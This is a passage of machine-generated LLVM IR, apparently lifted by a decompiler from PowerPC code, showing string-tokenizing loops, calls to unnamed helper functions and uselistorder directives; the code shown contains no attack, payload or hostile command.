  %v2_1000cdfc18 = load i8, i8* %v1_1000cdfc17, align 1
  %v3_1000cdfc19 = zext i8 %v2_1000cdfc18 to i32
  store i32 %v3_1000cdfc19, i32* %r0.global-to-local, align 4
  %v3_1000ce0021 = icmp eq i8 %v2_1000cdfc18, 0
  br i1 %v3_1000ce0021, label %dec_label_pc_1000ce08, label %dec_label_pc_1000cd98.preheader

dec_label_pc_1000cd8c:                            ; preds = %dec_label_pc_1000cda8
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000cd90 = inttoptr i32 %v0_1000cdcc to i8*
  store i8 0, i8* %v3_1000cd90, align 1
  %v0_1000cd94 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cd94 = add i32 %v0_1000cd94, 1
  store i32 %v1_1000cd94, i32* %r11.global-to-local, align 4
  %v1_1000cd98 = inttoptr i32 %v1_1000cd94 to i8*
  %v2_1000cd98 = load i8, i8* %v1_1000cd98, align 1
  %v3_1000cd98 = zext i8 %v2_1000cd98 to i32
  store i32 %v3_1000cd98, i32* %r0.global-to-local, align 4
  %v3_1000cd9c = icmp eq i8 %v2_1000cd98, 0
  br i1 %v3_1000cd9c, label %dec_label_pc_1000ce08, label %dec_label_pc_1000cda8

dec_label_pc_1000cda8:                            ; preds = %dec_label_pc_1000cd98.preheader, %dec_label_pc_1000cd8c
  %v0_1000cdcc = phi i32 [ %v1_1000cd94, %dec_label_pc_1000cd8c ], [ %v0_1000cd982, %dec_label_pc_1000cd98.preheader ]
  %v0_1000cdb0.in = phi i32 [ %v3_1000cd98, %dec_label_pc_1000cd8c ], [ %v3_1000cd985, %dec_label_pc_1000cd98.preheader ]
  %v0_1000cdb0 = mul nuw nsw i32 %v0_1000cdb0.in, 2
  %v3_1000cdac = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_1000cdac, i32* %r9.global-to-local, align 4
  %v2_1000cdb0 = add i32 %v3_1000cdac, %v0_1000cdb0
  %v3_1000cdb0 = inttoptr i32 %v2_1000cdb0 to i16*
  %v4_1000cdb0 = load i16, i16* %v3_1000cdb0, align 2
  %v5_1000cdb0 = zext i16 %v4_1000cdb0 to i32
  store i32 %v5_1000cdb0, i32* %r0.global-to-local, align 4
  %v1_1000cdb4 = and i32 %v5_1000cdb0, 32
  store i32 %v1_1000cdb4, i32* %r9.global-to-local, align 4
  %v3_1000cdb4 = icmp eq i32 %v1_1000cdb4, 0
  br i1 %v3_1000cdb4, label %dec_label_pc_1000cdbc, label %dec_label_pc_1000cd8c

dec_label_pc_1000cdbc:                            ; preds = %dec_label_pc_1000cda8
  %v0_1000cdbc = load i32, i32* @r29, align 4
  %v2_1000cdbc = icmp sgt i32 %v0_1000cdbc, 6
  br i1 %v2_1000cdbc, label %dec_label_pc_1000cdd8.preheader, label %dec_label_pc_1000cdc4

dec_label_pc_1000cdc4:                            ; preds = %dec_label_pc_1000cdbc
  %v1_1000cdc4 = mul i32 %v0_1000cdbc, 4
  store i32 %v1_1000cdc4, i32* %r0.global-to-local, align 4
  %v1_1000cdc8 = add i32 %v0_1000cdbc, 1
  store i32 %v1_1000cdc8, i32* @r29, align 4
  %v1_1000cdcc = load i32, i32* @r30, align 4
  %v3_1000cdcc = add i32 %v1_1000cdcc, %v1_1000cdc4
  %v4_1000cdcc = inttoptr i32 %v3_1000cdcc to i32*
  store i32 %v0_1000cdcc, i32* %v4_1000cdcc, align 4
  %v0_1000cdd89.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000cdd8.preheader

dec_label_pc_1000cdd8.preheader:                  ; preds = %dec_label_pc_1000cdc4, %dec_label_pc_1000cdbc
  %v0_1000cdd89 = phi i32 [ %v0_1000cdd89.pre, %dec_label_pc_1000cdc4 ], [ %v0_1000cdcc, %dec_label_pc_1000cdbc ]
  %v1_1000cdd810 = inttoptr i32 %v0_1000cdd89 to i8*
  %v2_1000cdd811 = load i8, i8* %v1_1000cdd810, align 1
  %v3_1000cdd812 = zext i8 %v2_1000cdd811 to i32
  store i32 %v3_1000cdd812, i32* %r0.global-to-local, align 4
  %v3_1000cddc14 = icmp eq i8 %v2_1000cdd811, 0
  br i1 %v3_1000cddc14, label %dec_label_pc_1000cdfc.loopexit, label %dec_label_pc_1000cde8.lr.ph

dec_label_pc_1000cde8.lr.ph:                      ; preds = %dec_label_pc_1000cdd8.preheader
  %v3_1000cdec.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000cde8

dec_label_pc_1000cdd4:                            ; preds = %dec_label_pc_1000cde8
  %v1_1000cdd4 = add i32 %v0_1000cdd4, 1
  store i32 %v1_1000cdd4, i32* %r11.global-to-local, align 4
  %v1_1000cdd8 = inttoptr i32 %v1_1000cdd4 to i8*
  %v2_1000cdd8 = load i8, i8* %v1_1000cdd8, align 1
  %v3_1000cdd8 = zext i8 %v2_1000cdd8 to i32
  store i32 %v3_1000cdd8, i32* %r0.global-to-local, align 4
  %v3_1000cddc = icmp eq i8 %v2_1000cdd8, 0
  br i1 %v3_1000cddc, label %dec_label_pc_1000cdfc.loopexit, label %dec_label_pc_1000cde8

dec_label_pc_1000cde8:                            ; preds = %dec_label_pc_1000cde8.lr.ph, %dec_label_pc_1000cdd4
  %v0_1000cdd4 = phi i32 [ %v0_1000cdd89, %dec_label_pc_1000cde8.lr.ph ], [ %v1_1000cdd4, %dec_label_pc_1000cdd4 ]
  %v0_1000cdf0.in = phi i32 [ %v3_1000cdd812, %dec_label_pc_1000cde8.lr.ph ], [ %v3_1000cdd8, %dec_label_pc_1000cdd4 ]
  %v0_1000cdf0 = mul nuw nsw i32 %v0_1000cdf0.in, 2
  store i32 %v3_1000cdec.pre, i32* %r9.global-to-local, align 4
  %v2_1000cdf0 = add i32 %v0_1000cdf0, %v3_1000cdec.pre
  %v3_1000cdf0 = inttoptr i32 %v2_1000cdf0 to i16*
  %v4_1000cdf0 = load i16, i16* %v3_1000cdf0, align 2
  %v5_1000cdf0 = zext i16 %v4_1000cdf0 to i32
  store i32 %v5_1000cdf0, i32* %r0.global-to-local, align 4
  %v1_1000cdf4 = and i32 %v5_1000cdf0, 32
  store i32 %v1_1000cdf4, i32* %r9.global-to-local, align 4
  %v3_1000cdf4 = icmp eq i32 %v1_1000cdf4, 0
  br i1 %v3_1000cdf4, label %dec_label_pc_1000cdd4, label %dec_label_pc_1000cdfc.loopexit

dec_label_pc_1000cdfc.loopexit:                   ; preds = %dec_label_pc_1000cde8, %dec_label_pc_1000cdd4, %dec_label_pc_1000cdd8.preheader
  %v0_1000cdfc = phi i32 [ %v0_1000cdd89, %dec_label_pc_1000cdd8.preheader ], [ %v0_1000cdd4, %dec_label_pc_1000cde8 ], [ %v1_1000cdd4, %dec_label_pc_1000cdd4 ]
  %v1_1000cdfc = inttoptr i32 %v0_1000cdfc to i8*
  %v2_1000cdfc = load i8, i8* %v1_1000cdfc, align 1
  %v3_1000cdfc = zext i8 %v2_1000cdfc to i32
  store i32 %v3_1000cdfc, i32* %r0.global-to-local, align 4
  %v3_1000ce00 = icmp eq i8 %v2_1000cdfc, 0
  br i1 %v3_1000ce00, label %dec_label_pc_1000ce08, label %dec_label_pc_1000cd98.preheader

dec_label_pc_1000cd98.preheader:                  ; preds = %dec_label_pc_1000cd80, %dec_label_pc_1000cdfc.loopexit
  %v0_1000cd982 = phi i32 [ %v0_1000cdfc, %dec_label_pc_1000cdfc.loopexit ], [ %v0_1000cd80, %dec_label_pc_1000cd80 ]
  %v1_1000cd983 = inttoptr i32 %v0_1000cd982 to i8*
  %v2_1000cd984 = load i8, i8* %v1_1000cd983, align 1
  %v3_1000cd985 = zext i8 %v2_1000cd984 to i32
  store i32 %v3_1000cd985, i32* %r0.global-to-local, align 4
  %v3_1000cd9c7 = icmp eq i8 %v2_1000cd984, 0
  br i1 %v3_1000cd9c7, label %dec_label_pc_1000ce08, label %dec_label_pc_1000cda8

dec_label_pc_1000ce08:                            ; preds = %dec_label_pc_1000cdfc.loopexit, %dec_label_pc_1000cd98.preheader, %dec_label_pc_1000cd8c, %dec_label_pc_1000cd80
  %v0_1000ce08 = load i32, i32* @r29, align 4
  %v1_1000ce0c = mul i32 %v0_1000ce08, 4
  store i32 %v1_1000ce0c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000ce14 = load i32, i32* @r30, align 4
  %v3_1000ce14 = add i32 %v2_1000ce14, %v1_1000ce0c
  %v4_1000ce14 = inttoptr i32 %v3_1000ce14 to i32*
  store i32 0, i32* %v4_1000ce14, align 4
  %tmp55 = icmp slt i32 %v0_1000ce08, 2
  br i1 %tmp55, label %dec_label_pc_1000cebc, label %dec_label_pc_1000ce1c

dec_label_pc_1000ce1c:                            ; preds = %dec_label_pc_1000ce08
  %v0_1000ce1c = load i32, i32* %r18.global-to-local, align 4
  %v3_1000ce1c = icmp eq i32 %v0_1000ce1c, 1
  br i1 %v3_1000ce1c, label %dec_label_pc_1000ced4, label %dec_label_pc_1000ce24

dec_label_pc_1000ce24:                            ; preds = %dec_label_pc_1000ce1c
  %v3_1000ce24 = icmp eq i32 %v0_1000ce1c, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_1000ce24, label %dec_label_pc_1000ce30, label %dec_label_pc_1000ce5c.preheader

dec_label_pc_1000ce5c.preheader:                  ; preds = %dec_label_pc_1000ce24
  %v1_1000ce5c23 = load i32, i32* @r29, align 4
  %v2_1000ce5c24 = icmp sgt i32 %v1_1000ce5c23, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000ce6429 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000ce6429, i32* @r3, align 4
  br i1 %v2_1000ce5c24, label %dec_label_pc_1000ce48, label %dec_label_pc_1000ce6c

dec_label_pc_1000ce30:                            ; preds = %dec_label_pc_1000ce24
  %v0_1000ce30 = load i32, i32* @r30, align 4
  %v1_1000ce30 = inttoptr i32 %v0_1000ce30 to i32*
  %v2_1000ce30 = load i32, i32* %v1_1000ce30, align 4
  store i32 %v2_1000ce30, i32* @r4, align 4
  %v0_1000ce34 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000ce38 = inttoptr i32 %v0_1000ce34 to i8*
  %v3_1000ce38 = call i32 @function_10007230(i8* %v2_1000ce38, i32 %v2_1000ce30)
  %v3_1000ce3c = icmp eq i32 %v3_1000ce38, 0
  br i1 %v3_1000ce3c, label %dec_label_pc_1000ce74, label %dec_label_pc_1000cebc

dec_label_pc_1000ce48:                            ; preds = %dec_label_pc_1000ce5c.preheader, %dec_label_pc_1000ce58
  %v1_1000ce48 = phi i32 [ %v1_1000ce60, %dec_label_pc_1000ce58 ], [ 4, %dec_label_pc_1000ce5c.preheader ]
  %v0_1000ce6431 = phi i32 [ %v0_1000ce64, %dec_label_pc_1000ce58 ], [ %v0_1000ce6429, %dec_label_pc_1000ce5c.preheader ]
  %v0_1000ce48 = load i32, i32* @r30, align 4
  %v2_1000ce48 = add i32 %v0_1000ce48, %v1_1000ce48
  %v3_1000ce48 = inttoptr i32 %v2_1000ce48 to i32*
  %v4_1000ce48 = load i32, i32* %v3_1000ce48, align 4
  store i32 %v4_1000ce48, i32* @r4, align 4
  %v2_1000ce4c = call i32 @function_1000770c(i32 %v0_1000ce6431, i32 %v4_1000ce48)
  %v3_1000ce50 = icmp eq i32 %v2_1000ce4c, 0
  %v0_1000ce6c.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000ce50, label %dec_label_pc_1000ce48.dec_label_pc_1000ce6c_crit_edge, label %dec_label_pc_1000ce58

dec_label_pc_1000ce58:                            ; preds = %dec_label_pc_1000ce48
  %v1_1000ce58 = add i32 %v0_1000ce6c.pre, 1
  store i32 %v1_1000ce58, i32* @r31, align 4
  %v1_1000ce5c = load i32, i32* @r29, align 4
  %v2_1000ce5c = icmp slt i32 %v1_1000ce58, %v1_1000ce5c
  %v1_1000ce60 = mul i32 %v1_1000ce58, 4
  store i32 %v1_1000ce60, i32* %r0.global-to-local, align 4
  %v0_1000ce64 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000ce64, i32* @r3, align 4
  br i1 %v2_1000ce5c, label %dec_label_pc_1000ce48, label %dec_label_pc_1000ce6c

dec_label_pc_1000ce48.dec_label_pc_1000ce6c_crit_edge: ; preds = %dec_label_pc_1000ce48
  %v1_1000ce6c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ce6c

dec_label_pc_1000ce6c:                            ; preds = %dec_label_pc_1000ce58, %dec_label_pc_1000ce48.dec_label_pc_1000ce6c_crit_edge, %dec_label_pc_1000ce5c.preheader
  %v1_1000ce6c = phi i32 [ %v1_1000ce6c.pre, %dec_label_pc_1000ce48.dec_label_pc_1000ce6c_crit_edge ], [ %v1_1000ce5c23, %dec_label_pc_1000ce5c.preheader ], [ %v1_1000ce5c, %dec_label_pc_1000ce58 ]
  %v0_1000ce6c = phi i32 [ %v0_1000ce6c.pre, %dec_label_pc_1000ce48.dec_label_pc_1000ce6c_crit_edge ], [ 1, %dec_label_pc_1000ce5c.preheader ], [ %v1_1000ce58, %dec_label_pc_1000ce58 ]
  %v2_1000ce6c = icmp slt i32 %v0_1000ce6c, %v1_1000ce6c
  br i1 %v2_1000ce6c, label %dec_label_pc_1000ce74, label %dec_label_pc_1000cebc

dec_label_pc_1000ce74:                            ; preds = %dec_label_pc_1000ce30, %dec_label_pc_1000ce6c
  %v0_1000ce74 = load i32, i32* %r19.global-to-local, align 4
  %v3_1000ce74 = icmp eq i32 %v0_1000ce74, 2
  br i1 %v3_1000ce74, label %dec_label_pc_1000ce7c, label %dec_label_pc_1000ce98

dec_label_pc_1000ce7c:                            ; preds = %dec_label_pc_1000ce74
  %v0_1000ce7c = load i32, i32* @r30, align 4
  %v1_1000ce7c = inttoptr i32 %v0_1000ce7c to i32*
  %v2_1000ce7c = load i32, i32* %v1_1000ce7c, align 4
  %v0_1000ce84 = load i32, i32* @r25, align 4
  store i32 268488332, i32* @lr, align 4
  %v3_1000ce88 = inttoptr i32 %v2_1000ce7c to i8*
  %v4_1000ce88 = call i32 @function_1000c20c(i32 2, i8* %v3_1000ce88, i32 %v0_1000ce84)
  %v2_1000ce8c = icmp sgt i32 %v4_1000ce88, 0
  br i1 %v2_1000ce8c, label %dec_label_pc_1000ccdc, label %dec_label_pc_1000ceb8

dec_label_pc_1000ce98:                            ; preds = %dec_label_pc_1000ce74
  %v3_1000ce98 = icmp eq i32 %v0_1000ce74, 10
  br i1 %v3_1000ce98, label %dec_label_pc_1000cea0, label %dec_label_pc_1000ceb8

dec_label_pc_1000cea0:                            ; preds = %dec_label_pc_1000ce98
  %v0_1000cea0 = load i32, i32* @r30, align 4
  %v1_1000cea0 = inttoptr i32 %v0_1000cea0 to i32*
  %v2_1000cea0 = load i32, i32* %v1_1000cea0, align 4
  %v0_1000cea8 = load i32, i32* %r21.global-to-local, align 4
  store i32 268488368, i32* @lr, align 4
  %v3_1000ceac = inttoptr i32 %v2_1000cea0 to i8*
  %v4_1000ceac = call i32 @function_1000c20c(i32 10, i8* %v3_1000ceac, i32 %v0_1000cea8)
  %v2_1000ceb0 = icmp sgt i32 %v4_1000ceac, 0
  br i1 %v2_1000ceb0, label %dec_label_pc_1000cd0c, label %dec_label_pc_1000ceb8

dec_label_pc_1000ceb8:                            ; preds = %dec_label_pc_1000ce7c, %dec_label_pc_1000ce98, %dec_label_pc_1000cea0
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_1000cebc

dec_label_pc_1000cebc:                            ; preds = %dec_label_pc_1000ce6c, %dec_label_pc_1000ce30, %dec_label_pc_1000ce08, %dec_label_pc_1000ceb8, %dec_label_pc_1000cd54
  %v0_1000cebc = load i32, i32* @r24, align 4
  %v0_1000cec0 = load i32, i32* @r27, align 4
  %v0_1000cec4 = load i32, i32* @r20, align 4
  store i32 268488396, i32* @lr, align 4
  %v3_1000cec8 = call i32 @function_1000694c(i32 %v0_1000cebc, i32 %v0_1000cec0, i32 %v0_1000cec4)
  %v3_1000cecc = icmp eq i32 %v3_1000cec8, 0
  br i1 %v3_1000cecc, label %dec_label_pc_1000ced4, label %dec_label_pc_1000cd64

dec_label_pc_1000ced4:                            ; preds = %dec_label_pc_1000cebc, %dec_label_pc_1000ce1c, %dec_label_pc_1000cd38
  %v0_1000ced4 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000ced4 = icmp eq i32 %v0_1000ced4, 1
  br i1 %v3_1000ced4, label %dec_label_pc_1000ceec, label %dec_label_pc_1000cedc

dec_label_pc_1000cedc:                            ; preds = %dec_label_pc_1000ced4
  %v0_1000cedc = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_1000cee4.354 to i32), i32* @lr, align 4
  %v1_1000cee0 = inttoptr i32 %v0_1000cedc to i16*
  %v2_1000cee0 = call i32 @function_10004e44(i16* %v1_1000cee0)
  br label %dec_label_pc_1000ceec

dec_label_pc_1000cee8:                            ; preds = %dec_label_pc_1000cca0, %dec_label_pc_1000cc70, %dec_label_pc_1000cc68, %dec_label_pc_1000cc5c, %dec_label_pc_1000cc4c, %dec_label_pc_1000cc34, %dec_label_pc_1000cc24
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_1000ceec

dec_label_pc_1000ceec:                            ; preds = %dec_label_pc_1000ced4, %dec_label_pc_1000cedc, %dec_label_pc_1000cccc, %dec_label_pc_1000cee8
  store i32 %v0_1000cbec, i32* %r0.global-to-local, align 4
  %v0_1000cef0 = load i32, i32* @r26, align 4
  ret i32 %v0_1000cef0

; uselistorder directives
  uselistorder i32 %v0_1000ce64, { 1, 0 }
  uselistorder i32 %v1_1000ce58, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000ce0c, { 1, 0 }
  uselistorder i32 %v0_1000ce08, { 1, 0 }
  uselistorder i32 %v3_1000cd985, { 1, 0 }
  uselistorder i32 %v0_1000cd982, { 1, 0 }
  uselistorder i32 %v1_1000cdc4, { 1, 0 }
  uselistorder i32 %v0_1000cdbc, { 1, 0, 2 }
  uselistorder i32 %v2_1000cd6c, { 1, 0 }
  uselistorder i32 %v0_1000cc5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000cc34.pr, { 1, 0, 2 }
  uselistorder i32 %v1_1000cbf8, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 11, 30, 12, 27, 19, 13, 14, 28, 15, 16, 18, 17, 29, 20, 21, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 3, 4, 8, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 (i16*)* @function_10004e44, { 6, 7, 4, 5, 0, 1, 2, 3, 9, 8 }
  uselistorder i32 (i32, i32, i32)* @function_1000694c, { 3, 2, 4, 1, 0 }
  uselistorder i32 10, { 10, 28, 29, 30, 31, 32, 33, 34, 17, 18, 19, 20, 21, 36, 35, 37, 38, 7, 39, 2, 41, 3, 42, 1, 8, 11, 45, 12, 25, 4, 5, 22, 9, 6, 27, 40, 43, 44, 13, 0, 23, 24, 14, 26, 15, 16 }
  uselistorder i32 (i32, i32)* @function_1000770c, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_10007230, { 1, 2, 3, 4, 0 }
  uselistorder i32 6, { 18, 19, 20, 21, 22, 0, 1, 2, 12, 13, 14, 15, 6, 7, 8, 3, 23, 24, 4, 25, 9, 26, 5, 10, 11, 16, 17 }
  uselistorder i32* @global_var_1001044c, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 12, { 33, 34, 35, 0, 36, 37, 38, 11, 14, 45, 50, 8, 9, 10, 12, 46, 56, 57, 58, 59, 60, 61, 62, 63, 5, 6, 64, 65, 66, 69, 15, 22, 49, 16, 51, 52, 53, 54, 4, 17, 55, 1, 2, 7, 18, 3, 13, 39, 40, 41, 42, 70, 43, 67, 68, 47, 48, 21, 19, 20, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 44 }
  uselistorder i32 80, { 5, 4, 3, 2, 1, 9, 0, 6, 7, 8 }
  uselistorder i32 48, { 12, 7, 8, 9, 1, 10, 11, 4, 14, 15, 2, 16, 17, 18, 6, 19, 5, 20, 3, 0, 21, 22, 13 }
  uselistorder i32 -48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 16, { 9, 29, 30, 31, 10, 32, 33, 0, 34, 35, 1, 36, 11, 55, 56, 66, 67, 37, 38, 39, 57, 58, 59, 60, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 88, 81, 4, 24, 17, 21, 18, 40, 41, 2, 27, 5, 28, 92, 93, 94, 42, 43, 44, 45, 46, 47, 61, 62, 48, 49, 50, 82, 83, 84, 85, 86, 87, 89, 90, 91, 63, 64, 65, 3, 12, 19, 20, 6, 22, 7, 23, 8, 25, 26, 51, 52, 53, 13, 54, 14, 15, 16 }
  uselistorder i32* @r27, { 14, 15, 16, 17, 18, 19, 1, 20, 21, 22, 23, 9, 10, 6, 11, 3, 2, 24, 25, 26, 27, 28, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 56, 57, 80, 4, 81, 82, 87, 54, 55, 39, 40, 41, 42, 83, 84, 85, 58, 59, 43, 44, 45, 60, 61, 5, 62, 63, 64, 65, 66, 7, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 8, 12, 13, 86, 46, 47, 48, 49, 78, 79, 50, 51, 52, 53 }
  uselistorder i32 32, { 27, 28, 29, 19, 30, 31, 20, 16, 17, 24, 1, 2, 3, 32, 33, 38, 13, 18, 39, 40, 14, 15, 25, 26, 12, 34, 35, 36, 41, 42, 21, 43, 44, 45, 46, 47, 48, 49, 0, 50, 51, 37, 5, 6, 4, 8, 7, 22, 23, 10, 11, 9 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000ceec, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cebc, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000ceb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ce74, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ce48, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce08, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000cd98.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000cde8, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd80, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd54, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd38, { 1, 0 }
  uselistorder label %dec_label_pc_1000cca0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc34, { 1, 0 }
}

define i32 @function_1000cf04(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cf04:
  %v0_1000cf08 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268488476, i32* @lr, align 4
  %v0_1000cf18 = call i32 @function_10004c60()
  %v0_1000cf20 = load i32, i32* @r29, align 4
  store i32 %v0_1000cf08, i32* @lr, align 4
  %v2_1000cf30 = call i32 @function_10004cf0(i32 %v0_1000cf18, i32 %v0_1000cf20)
  ret i32 %v2_1000cf30

; uselistorder directives
  uselistorder i32 ()* @function_10004c60, { 0, 2, 1 }
}

define i32 @function_1000cf34(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000cf34:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000cf38 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000cf60 = call i32 @__asm_mfcr()
  %v1_1000cf64 = and i32 %v0_1000cf60, 268435456
  %v3_1000cf64 = icmp eq i32 %v1_1000cf64, 0
  store i32 %v0_1000cf60, i32* %r31.global-to-local, align 4
  store i32 %v0_1000cf60, i32* %r0.global-to-local, align 4
  br i1 %v3_1000cf64, label %dec_label_pc_1000cf88, label %dec_label_pc_1000cf78

dec_label_pc_1000cf78:                            ; preds = %dec_label_pc_1000cf34
  %v0_1000cf78 = call i32 @function_10004e38()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000cf80 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cf80 = inttoptr i32 %v0_1000cf78 to i32*
  store i32 %v0_1000cf80, i32* %v2_1000cf80, align 4
  %v0_1000cf8c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000cf8c

dec_label_pc_1000cf88:                            ; preds = %dec_label_pc_1000cf34
  %v3_1000cf70 = icmp eq i32 %v0_1000cf60, 0
  br i1 %v3_1000cf70, label %dec_label_pc_1000cf98, label %dec_label_pc_1000cf8c

dec_label_pc_1000cf8c:                            ; preds = %dec_label_pc_1000cf88, %dec_label_pc_1000cf78
  %v0_1000cf8c = phi i32 [ %v0_1000cf60, %dec_label_pc_1000cf88 ], [ %v0_1000cf8c.pre, %dec_label_pc_1000cf78 ]
  %tmp = icmp slt i32 %v0_1000cf8c, 0
  %v1_1000cf90 = zext i1 %tmp to i32
  %v2_1000cf90 = ashr i32 %v0_1000cf8c, 31
  %v3_1000cf90 = and i32 %v2_1000cf90, -2
  %v4_1000cf90 = or i32 %v3_1000cf90, %v1_1000cf90
  br label %dec_label_pc_1000cfa0

dec_label_pc_1000cf98:                            ; preds = %dec_label_pc_1000cf88
  %v3_1000cf98 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000cfa0

dec_label_pc_1000cfa0:                            ; preds = %dec_label_pc_1000cf8c, %dec_label_pc_1000cf98
  %v0_1000cfb0 = phi i32 [ %v4_1000cf90, %dec_label_pc_1000cf8c ], [ %v3_1000cf98, %dec_label_pc_1000cf98 ]
  store i32 %v0_1000cf38, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000cfb0

; uselistorder directives
  uselistorder i32 %v0_1000cf8c, { 1, 0 }
  uselistorder i32 %v0_1000cf60, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 10, 11, 12, 1, 0, 2, 9, 3, 4, 13, 14, 5, 15, 16, 17, 6, 19, 20, 18, 21, 7, 8 }
  uselistorder i32 31, { 28, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 29, 30, 1, 2, 24, 25, 31, 32, 33, 7, 8, 3, 4, 0, 5, 9, 10, 11, 12, 13, 34, 35, 36, 49, 50, 47, 48, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 27, 6, 26 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_1000cfa0, { 1, 0 }
}

define i32 @function_1000cfb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cfb4:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000cfcc = call i32 @__asm_mfcr()
  %v1_1000cfd0 = and i32 %v0_1000cfcc, 268435456
  %v3_1000cfd0 = icmp eq i32 %v1_1000cfd0, 0
  store i32 %v0_1000cfcc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000cfd0, label %dec_label_pc_1000cfe8, label %dec_label_pc_1000cfdc

dec_label_pc_1000cfdc:                            ; preds = %dec_label_pc_1000cfb4
  %v0_1000cfdc = call i32 @function_10004e38()
  %v0_1000cfe0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cfe0 = inttoptr i32 %v0_1000cfdc to i32*
  store i32 %v0_1000cfe0, i32* %v2_1000cfe0, align 4
  br label %dec_label_pc_1000cfe8

dec_label_pc_1000cfe8:                            ; preds = %dec_label_pc_1000cfb4, %dec_label_pc_1000cfdc
  %v0_1000cff8 = phi i32 [ %v0_1000cfcc, %dec_label_pc_1000cfb4 ], [ -1, %dec_label_pc_1000cfdc ]
  ret i32 %v0_1000cff8

; uselistorder directives
  uselistorder i32 ()* @function_10004e38, { 35, 28, 45, 67, 66, 65, 44, 34, 27, 26, 43, 19, 18, 42, 25, 24, 57, 17, 16, 56, 14, 51, 13, 12, 11, 10, 9, 55, 8, 7, 5, 37, 6, 50, 49, 48, 47, 64, 63, 62, 30, 41, 4, 3, 23, 0, 22, 1, 33, 32, 54, 53, 52, 15, 46, 36, 21, 40, 20, 39, 38, 29, 31, 2, 61, 60, 59, 58 }
  uselistorder i32 268435456, { 10, 13, 7, 16, 2, 17, 3, 19, 5, 20, 21, 22, 23, 24, 4, 25, 26, 27, 8, 18, 6, 9, 14, 0, 15, 1, 12, 11, 28 }
  uselistorder label %dec_label_pc_1000cfe8, { 1, 0 }
}

define i32 @function_1000cffc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cffc:
  %v1_1000cffc = add i32 %arg1, 128
  %v1_1000d000 = mul i32 %arg1, 2
  %v2_1000d004 = icmp ugt i32 %v1_1000cffc, 383
  %v0_1000d008 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000d004, i32 %v0_1000d008)
  %v3_1000d010 = load i32, i32* bitcast (i32** @global_var_10010454.258 to i32*), align 4
  %v2_1000d014 = add i32 %v1_1000d000, %v3_1000d010
  %v3_1000d014 = inttoptr i32 %v2_1000d014 to i16*
  %v4_1000d014 = load i16, i16* %v3_1000d014, align 2
